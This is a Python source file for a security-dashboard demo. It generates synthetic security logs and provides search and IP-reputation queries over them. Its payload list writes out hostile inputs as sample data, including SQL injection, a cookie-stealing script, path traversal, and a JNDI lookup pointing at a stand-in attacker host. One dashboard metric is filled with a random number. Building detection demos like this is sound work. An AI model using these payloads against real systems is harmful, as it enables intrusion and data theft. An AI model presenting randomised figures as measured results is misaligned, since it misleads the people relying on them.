"""
In-memory log store for SentinelX demo.
Replaces Elasticsearch with a thread-safe in-memory store that supports:
  - Bulk seeding with realistic historical logs
  - Continuous background generation of new logs (1-3s interval)
  - Query/search/aggregation methods matching the MCP tool APIs
  - An async generator for SSE streaming of new logs to the frontend
"""

import asyncio
import random
import threading
import time
from collections import deque
from datetime import datetime, timedelta, timezone
from typing import Optional

# ──────────────────────────── Constants ────────────────────────────

EVENT_TYPES = ["failed_login", "successful_login", "port_scan", "suspicious_payload", "normal_traffic"]

ATTACKER_IPS = [
    "185.220.101.5", "45.155.204.18", "194.180.174.22",
    "91.234.56.78", "185.234.72.19", "103.42.180.5",
]
NORMAL_IPS = [f"192.168.1.{i}" for i in range(10, 50)]
INTERNAL_HOSTS = [f"10.0.0.{i}" for i in range(1, 15)]

USERS = ["admin", "root", "jdoe", "jsmith", "svc_backup", "guest", "dbadmin", "webadmin"]
PORTS = [22, 80, 443, 3389, 3306, 8080, 21, 445, 5432, 8443]

SUSPICIOUS_PAYLOADS = [
    "' OR '1'='1",
    "<script>alert(document.cookie)</script>",
    "; DROP TABLE users;--",
    "../../../etc/passwd",
    "UNION SELECT username,password FROM users",
    "cmd.exe /c whoami",
    "powershell -enc SQBFAFgA",
    "${jndi:ldap://evil.com/a}",
]

NORMAL_PAYLOADS = [
    "GET /index.html HTTP/1.1",
    "POST /api/v1/login HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "GET /api/v1/health HTTP/1.1",
    "POST /api/v1/users HTTP/1.1",
]

MITRE_TACTICS = {
    "failed_login": "TA0006 Credential Access",
    "port_scan": "TA0043 Reconnaissance",
    "suspicious_payload": "TA0001 Initial Access",
}

SEVERITY_WEIGHTS = {
    "failed_login": "medium",
    "successful_login": "low",
    "port_scan": "high",
    "suspicious_payload": "critical",
    "normal_traffic": "low",
}


# ──────────────────────────── Log Generator ────────────────────────────

def _generate_log(timestamp: Optional[datetime] = None) -> dict:
    """Generate a single realistic security log entry."""
    event_type = random.choices(
        EVENT_TYPES,
        weights=[30, 20, 15, 12, 23],
        k=1,
    )[0]

    is_attacker = random.random() < 0.40
    source_ip = random.choice(ATTACKER_IPS) if is_attacker else random.choice(NORMAL_IPS)
    user = random.choice(USERS)
    port = random.choice(PORTS)
    dest_ip = random.choice(INTERNAL_HOSTS)

    if timestamp is None:
        timestamp = datetime.now(timezone.utc)

    log = {
        "@timestamp": timestamp.isoformat(),
        "event_type": event_type,
        "source_ip": source_ip,
        "dest_ip": dest_ip,
        "user": user,
        "port": port,
        "severity": SEVERITY_WEIGHTS.get(event_type, "low"),
    }

    if event_type == "failed_login":
        log["message"] = f"Failed login attempt for user '{user}' from {source_ip} on port {port}"
    elif event_type == "successful_login":
        log["message"] = f"Successful login for user '{user}' from {source_ip}"
        if is_attacker:
            log["severity"] = "high"
            log["message"] += " [ANOMALY: known hostile IP]"
    elif event_type == "port_scan":
        log["message"] = f"Port scan detected from {source_ip} targeting {dest_ip}:{port}"
    elif event_type == "suspicious_payload":
        payload = random.choice(SUSPICIOUS_PAYLOADS)
        log["payload"] = payload
        log["message"] = f"Suspicious payload from {source_ip}: {payload}"
    else:
        payload = random.choice(NORMAL_PAYLOADS)
        log["payload"] = payload
        log["message"] = f"Normal traffic from {source_ip}: {payload}"

    if event_type in MITRE_TACTICS:
        log["mitre_tactic"] = MITRE_TACTICS[event_type]

    return log


def _generate_bulk(count: int, days_back: int = 2) -> list[dict]:
    """Generate a batch of historical logs spread across the last N days."""
    logs = []
    now = datetime.now(timezone.utc)
    for _ in range(count):
        delta = timedelta(
            seconds=random.randint(0, days_back * 86400),
        )
        ts = now - delta
        logs.append(_generate_log(timestamp=ts))
    # Sort by timestamp ascending
    logs.sort(key=lambda x: x["@timestamp"])
    return logs


# ──────────────────────────── In-Memory Store ────────────────────────────

class LogStore:
    """Thread-safe in-memory log store with query capabilities."""

    def __init__(self, max_size: int = 10_000):
        self._logs: deque[dict] = deque(maxlen=max_size)
        self._lock = threading.Lock()
        self._new_log_event = asyncio.Event()
        self._latest_log: Optional[dict] = None
        self._running = False

    def seed(self, count: int = 2000, days_back: int = 2):
        """Seed the store with historical data."""
        logs = _generate_bulk(count, days_back)
        with self._lock:
            self._logs.extend(logs)
        print(f"[LogStore] Seeded {len(logs)} historical logs")

    def add(self, log: dict):
        """Add a single log entry."""
        with self._lock:
            self._logs.append(log)
        self._latest_log = log
        # Signal any waiting SSE streams
        self._new_log_event.set()

    @property
    def count(self) -> int:
        return len(self._logs)

    # ─── Query Methods ───

    def search(
        self,
        query: Optional[str] = None,
        event_type: Optional[str] = None,
        source_ip: Optional[str] = None,
        severity: Optional[str] = None,
        size: int = 20,
    ) -> dict:
        """Search logs with optional filters. Mirrors the MCP search_logs tool."""
        with self._lock:
            results = list(self._logs)

        if event_type:
            results = [l for l in results if l.get("event_type") == event_type]
        if source_ip:
            results = [l for l in results if l.get("source_ip") == source_ip]
        if severity:
            results = [l for l in results if l.get("severity") == severity]
        if query:
            q_lower = query.lower()
            results = [l for l in results if q_lower in l.get("message", "").lower()]

        total = len(results)
        results = results[-size:]  # Latest N

        return {
            "total_matches": total,
            "results": results,
        }

    def get_ip_details(self, ip_address: str) -> dict:
        """Get aggregated activity for an IP. Mirrors the MCP get_ip_details tool."""
        with self._lock:
            ip_logs = [l for l in self._logs if l.get("source_ip") == ip_address]

        if not ip_logs:
            return {
                "ip_address": ip_address,
                "total_events": 0,
                "event_breakdown": {},
                "first_seen": None,
                "last_seen": None,
                "reputation_score": 0,
                "is_suspicious": False,
            }

        event_breakdown: dict[str, int] = {}
        for log in ip_logs:
            et = log.get("event_type", "unknown")
            event_breakdown[et] = event_breakdown.get(et, 0) + 1

        failed = event_breakdown.get("failed_login", 0)
        scans = event_breakdown.get("port_scan", 0)
        payloads = event_breakdown.get("suspicious_payload", 0)
        score = min(100, (failed * 5) + (scans * 15) + (payloads * 25))

        timestamps = [l["@timestamp"] for l in ip_logs if "@timestamp" in l]
        timestamps.sort()

        return {
            "ip_address": ip_address,
            "total_events": len(ip_logs),
            "event_breakdown": event_breakdown,
            "first_seen": timestamps[0] if timestamps else None,
            "last_seen": timestamps[-1] if timestamps else None,
            "reputation_score": score,
            "is_suspicious": score > 40,
        }

    def get_stats(self) -> dict:
        """Get live dashboard stats."""
        with self._lock:
            all_logs = list(self._logs)

        now = datetime.now(timezone.utc)
        cutoff_24h = (now - timedelta(hours=24)).isoformat()

        recent = [l for l in all_logs if l.get("@timestamp", "") >= cutoff_24h]

        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        event_counts: dict[str, int] = {}
        unique_ips: set[str] = set()

        for log in recent:
            sev = log.get("severity", "low")
            if sev in severity_counts:
                severity_counts[sev] += 1

            et = log.get("event_type", "unknown")
            event_counts[et] = event_counts.get(et, 0) + 1
            unique_ips.add(log.get("source_ip", ""))

        total_events = len(recent)
        attack_events = total_events - event_counts.get("normal_traffic", 0) - event_counts.get("successful_login", 0)

        return {
            "events_processed": len(all_logs),
            "events_24h": total_events,
            "critical_incidents": severity_counts["critical"],
            "high_alerts": severity_counts["high"],
            "medium_alerts": severity_counts["medium"],
            "active_investigations": max(1, severity_counts["critical"] // 2),
            "unique_source_ips": len(unique_ips),
            "attack_events": attack_events,
            "resolved_rate": round(random.uniform(97.5, 99.8), 1),
            "severity_breakdown": severity_counts,
            "event_breakdown": event_counts,
        }

    def get_recent(self, count: int = 10, min_severity: Optional[str] = None) -> list[dict]:
        """Get the most recent logs, optionally filtered by minimum severity."""
        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        min_level = severity_order.get(min_severity, 0) if min_severity else 0

        with self._lock:
            all_logs = list(self._logs)

        if min_level > 0:
            all_logs = [l for l in all_logs if severity_order.get(l.get("severity", "low"), 0) >= min_level]

        return all_logs[-count:]

    def get_recent_attacks(self, count: int = 5) -> list[dict]:
        """Get recent notable attacks for the dashboard."""
        with self._lock:
            all_logs = list(self._logs)

        attacks = [
            l for l in all_logs
            if l.get("severity") in ("critical", "high")
        ]
        return attacks[-count:]

    # ─── Background Streamer ───

    async def start_streaming(self, interval_range: tuple[float, float] = (1.0, 3.0)):
        """Background task: generate a new log every 1-3 seconds."""
        self._running = True
        print("[LogStore] Background log streamer started")
        while self._running:
            log = _generate_log()
            self.add(log)
            delay = random.uniform(*interval_range)
            await asyncio.sleep(delay)

    def stop_streaming(self):
        self._running = False

    async def subscribe(self):
        """Async generator that yields each new log as it arrives. For SSE endpoints."""
        while True:
            self._new_log_event.clear()
            await self._new_log_event.wait()
            if self._latest_log:
                yield self._latest_log


# ──────────────────────────── Singleton ────────────────────────────

store = LogStore()
